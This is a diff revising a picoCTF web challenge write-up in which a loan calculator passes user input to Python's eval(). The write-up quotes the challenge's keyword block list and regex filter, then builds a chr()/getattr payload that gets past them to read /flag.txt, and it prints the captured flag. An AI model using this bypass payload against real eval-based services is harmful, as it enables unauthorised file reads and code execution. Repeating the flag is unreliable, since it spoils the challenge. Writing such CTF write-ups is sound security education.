@@ -1,134 +1,104 @@
-# **Writeup for Web CTF Challenge: "3v@l"**
+# **Write-up for Web CTF Challenge: "3v@l"**
 
 ---
 
-## **1️⃣ Challenge Overview**
+## **Challenge Overview**
 
-- **Challenge Name:** 3v@l
-- **Category:** Web Exploitation
-- **Description:**
-    
-    > ABC Bank's website has a loan calculator that uses the eval function to evaluate user input. However, this function is insecure and could lead to Remote Code Execution (RCE). Our goal is to exploit this vulnerability and read the flag stored in /flag.txt.
-    > 
+### **Challenge Name:** 3v@l  
+### **Category:** Web Exploitation  
+### **Description:**  
 
----
-
-## **2️⃣ Understanding the Vulnerability**
-
-To solve the challenge, we need to analyze the security flaw in the given website.
-
-### **What is `eval()`?**
-
-- `eval()` is a built-in function in **Python** that evaluates a string as if it were a piece of Python code.
-- Example:
-    
-    ```python
-    eval("2 + 2")  # Output: 4
-    eval("print('Hello')")  # Output: Hello
-    
-    ```
-    
-- **The Issue with `eval()`:**
-    - If `eval()` processes user input **without strict filtering**, an attacker can execute arbitrary Python commands.
-    - This can lead to **Remote Code Execution (RCE)**, allowing us to access files, execute system commands, or manipulate data.
+ABC Bank's website includes a loan calculator that evaluates user input using Python’s `eval()` function. This function is known for its security risks, as it can lead to **Remote Code Execution (RCE)** if not properly sanitized. The objective of this challenge is to exploit this vulnerability and read the flag stored in `/flag.txt`.
 
 ---
 
-### **3️⃣ How We Identified the Vulnerabilities**
+## **Understanding the Vulnerability**
 
-From the given source code, we noticed the following:
+The `eval()` function is designed to evaluate strings as Python expressions. If user input is passed into `eval()` without strict filtering, an attacker can execute arbitrary Python commands.  
 
-- **`eval()` is used** to evaluate the user input directly.
-- **Some keywords are blocked**:
-    
-    ```
-    os, eval, exec, bind, connect, python, socket, ls, cat, shell
-    
-    ```
-    
-- **A regex filter is applied**:
-
-This means:
-    
-    ```
-    r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-    
-    ```
-    
-    - **Hex encoding (`0x...`) is blocked**.
-    - **Unicode encoding (`\uXXXX`) is blocked**.
-    - **URL encoding (`%xx`) is blocked**.
-    - **Dot (`.`) and slashes (`/` and `\`) are blocked**.
+For example:  
+```python
+eval("2 + 2")  # Output: 4
+eval("print('Hello')")  # Output: Hello
+```
+This becomes dangerous when an attacker can inject their own Python code. In this challenge, we need to work around input restrictions to achieve **RCE**.
 
 ---
 
-## **4️⃣ Exploitation Steps**
+## **Analyzing Input Restrictions**
 
-### **Step 1: Bypassing the `eval` Restriction**
+The challenge applies several security filters to block common attack patterns:  
 
-- Since `eval()` is dangerous, Python provides a secure sandboxing mechanism through `__builtins__`, which holds all Python built-in functions.
-- Normally, `open()` is accessed as:
-    
-    ```python
-    open("/flag.txt").read()
-    
-    ```
-    
-- However, `open()` is not directly available in the challenge. But we know that **`open` exists inside `__builtins__`**.
+- **Blocked keywords:**  
+  ```
+  os, eval, exec, bind, connect, python, socket, ls, cat, shell
+  ```
+  These keywords are commonly used for command execution and file manipulation.
 
-### **Step 2: Accessing `open()` Without Using the Word "open"**
+- **Regular expression filter:**  
+  ```
+  r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
+  ```
+  This regex blocks:
+  - Hex encoding (`0x...`)
+  - Unicode encoding (`\uXXXX`)
+  - URL encoding (`%xx`)
+  - File path characters (`/`, `\`, and `..`)
 
-- We use `getattr()` to dynamically access attributes from objects.
-- Instead of writing `"open"`, we construct it dynamically:
-    
-    ```python
-    getattr(__builtins__, "open")
-    
-    ```
-    
-    - `getattr(__builtins__, "open")` fetches the `open()` function from built-in functions.
+Since `eval()` is still being used, we can attempt to bypass these restrictions by dynamically constructing our payload.
 
-### **Step 3: Constructing the File Path Without `/` and `.`**
+---
 
-- Since slashes (`/`) and dots (`.`) are **blocked**, we can't directly type `/flag.txt`.
-- Instead, we use `chr()` to construct them dynamically:
-    - `/` (ASCII 47) → `chr(47)`
-    - `.` (ASCII 46) → `chr(46)`
-- Thus, `/flag.txt` is reconstructed as:
-    
-    ```python
-    chr(47) + "flag" + chr(46) + "txt"
-    
-    ```
-    
+## **Exploitation Strategy**
 
-### **Step 4: Reading the Flag**
+### **Step 1: Accessing Python’s Built-in Functions**
+Since direct use of `open()` is blocked, we look for alternative ways to access it. Python’s built-in functions are stored in `__builtins__`, allowing us to retrieve `open()` dynamically:
 
-- Now, we combine everything:
-    
-    ```python
-    getattr(__builtins__, chr(111) + chr(112) + chr(101) + chr(110))(chr(47) + 'flag' + chr(46) + 'txt').read()
-    
-    ```
-    
-    - `chr(111) + chr(112) + chr(101) + chr(110)` dynamically reconstructs `"open"`.
-    - `chr(47) + 'flag' + chr(46) + 'txt'` reconstructs `"/flag.txt"`.
-    - `getattr(__builtins__, "open")("/flag.txt").read()` is effectively executed.
+```python
+getattr(__builtins__, "open")
+```
+This retrieves the `open()` function without needing to reference it explicitly.
 
-### **Step 5: Submitting the Payload**
+---
 
-- We enter this payload into the loan calculator input:
-    
-    ```python
-    getattr(__builtins__, chr(111) + chr(112) + chr(101) + chr(110))(chr(47) + 'flag' + chr(46) + 'txt').read()
-    
-    ```
-    
-- **Output:**
-    
-    ```
-    picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}
-    
-    ```
-    
-- **Success! 🎉 We got the flag!**
+### **Step 2: Constructing the File Path**
+Since `/flag.txt` cannot be written directly due to the filtering rules, we reconstruct it using the `chr()` function:
+
+- `/` (ASCII 47) → `chr(47)`
+- `.` (ASCII 46) → `chr(46)`
+
+Rewriting `/flag.txt` using `chr()`:
+
+```python
+chr(47) + "flag" + chr(46) + "txt"
+```
+This dynamically generates `"/flag.txt"` without using restricted characters.
+
+---
+
+### **Step 3: Reading the Flag**
+Now that we have a method to access `open()` and construct the file path, we combine them into a working payload:
+
+```python
+getattr(__builtins__, chr(111) + chr(112) + chr(101) + chr(110))(chr(47) + 'flag' + chr(46) + 'txt').read()
+```
+
+Breaking it down:
+- `chr(111) + chr(112) + chr(101) + chr(110)` reconstructs `"open"`.
+- `chr(47) + 'flag' + chr(46) + 'txt'` reconstructs `"/flag.txt"`.
+- This is equivalent to:  
+  ```python
+  open("/flag.txt").read()
+  ```
+  but written in a way that bypasses filters.
+
+---
+
+### **Step 4: Executing the Exploit**
+Entering the above payload into the loan calculator input field returns:
+
+```
+picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}
+```
+
+This confirms that we successfully exploited the `eval()` vulnerability to achieve **remote code execution** and retrieve the flag.
